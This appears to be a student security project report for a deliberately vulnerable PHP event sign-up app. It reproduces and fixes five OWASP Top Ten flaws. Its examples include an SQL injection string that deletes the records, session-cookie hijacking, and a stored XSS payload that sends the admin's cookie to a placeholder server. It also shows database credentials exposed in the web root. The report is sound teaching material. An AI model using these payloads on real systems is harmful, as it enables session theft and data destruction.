# The Report

This project is done with PHP in a LAMP environment.<br> 
The requirements:

1. Windows, OS X or Linux as the host
2. OWASP ZAP
3. Firefox with the Advanced Cookie Manager add-on
4. VirtualBox
5. Debian as a virtual machine

See https://github.com/j0ly/firstproject/blob/master/README.md for installation instructions.

There are more problems with this code besides those which I have mentioned and provided a fix for here below. And regarding the suggested fixes, I know that there are many things that could be done to further improve the security. But I had to draw the line somewhere. The task was to have at least 5 OWASP Top Ten vulnerabilies, and to provide a fix for them, which I think I have done.


The OWASP vulnerabilities:

## A1-Injection

The content of the database can be deleted using SQL injection.

### How to identify 
1. Sign up some users to the event. Check from the Admin page. 
2. Then go to the Cancel page and enter: ```' OR '1'='1```. 
3. All the sign-ups are now gone, as you can see from the Admin page!    

### How to fix
Add this after line 12 in delete.php;

```$ticket = mysqli_real_escape_string($conn, $ticket);```

## A2-Broken Authentication and Session Management
The cookie-session-id, which is used for authentication, is sent over an unencrypted connection.<br>

### How to identify
You can get access to the Admin page using the stolen cookie-session-id like this (but before you begin, install the “Advanced Cookie Manager” add-on to Firefox):

1. Log in to the Admin pages, look who have signed-up, and click the "home" link.
2. You are now back at the starting page, which doesn't use SSL.
3. But with OWASP ZAP you can see that the session-cookie is still in use, and the session-id thus visible if someone would have the possibility to eavesdrop. Copy the session-id (see [README.md](README.md))!
  * If you were using the Firefox browser for this, restart it before the next step...
4. Go to the Admin login-page with Firefox, but don’t log in! 
5. Open “Advanced Cookie Manager” and enter the cookie-session-id you captured with OWASP ZAP into the "Value" box (see [README.md](README.md)), replacing the existing one (delete first, then paste). Save the change.
6. Open the Event X start page, click the "Admin" link, and you’re in without entering credentials!

### How to fix
Force HTTPS for the whole server;

1. In /etc/apache2/sites-available/000-default.conf, add this line after the "DocumentRoot" line (modify "yourserver" to match the IP of your server); 
  * ``` Redirect permanent / https://yourserver/ ``` 
2. Restart Apache with this command; ``` apachectl restart ```

## A3-Cross-Site Scripting (XSS)
The XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
### How to identify
Enter this code into the address field on the SignUp page;

```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```

When the admin logs in and takes a look at the sign-ups, his session-id should be written to the Apache logs of “yourserver”.<br> 
But you can also test with code like this, in any of the fields on the SignUp page; 
```<body onload=alert('hello')>```

### How to fix
In done.php you can find these lines;
```
$fname = $_POST["name"];
$faddress = $_POST["address"];
$creditcard = $_POST["creditcard"];
```
Replace them with these lines;
```
$fname = clean($_POST["name"]);
$faddress = clean($_POST["address"]);
$creditcard = clean($_POST["creditcard"]);

function clean($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}
```

## A6-Sensitive Data Exposure
Credit card numbers are sent in cleartext with POST, over an unencrypted connection.

### How to identify

1. Go to the SignUp page and fill in the requested information, including a (imaginary) credit card number.
2. Press Submit, and capture the credit card number with OWASP ZAP (see [README.md](README.md)).

### How to fix: 
Force HTTPS for the whole server (see the A2-fix)! 

## A7-Missing Function Level Access Control
The database credentials are stored in an easy to guess plaintext config file, inside the web-root, and is lacking access control.
### How to identify
Modify “yourserver” in this link to match your installation; http://yourserver/firstproject/admin/config.ini.<br> 
Then open this link with your browser, and you should see the credentials.

### How to fix
Deny access to the config.ini file. 

There is already a .htaccess file in the admin folder that should do that, but Apache does not by default enable the use of .htaccess files. To enable, do this:

  Open /etc/apache2/apache2.conf in an editor, and find these lines;
  ```
  <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
  </Directory>
  ```
  Change “AllowOverride None” to “AllowOverride All”. Run the command “apachectl restart”, and try to open the link again.
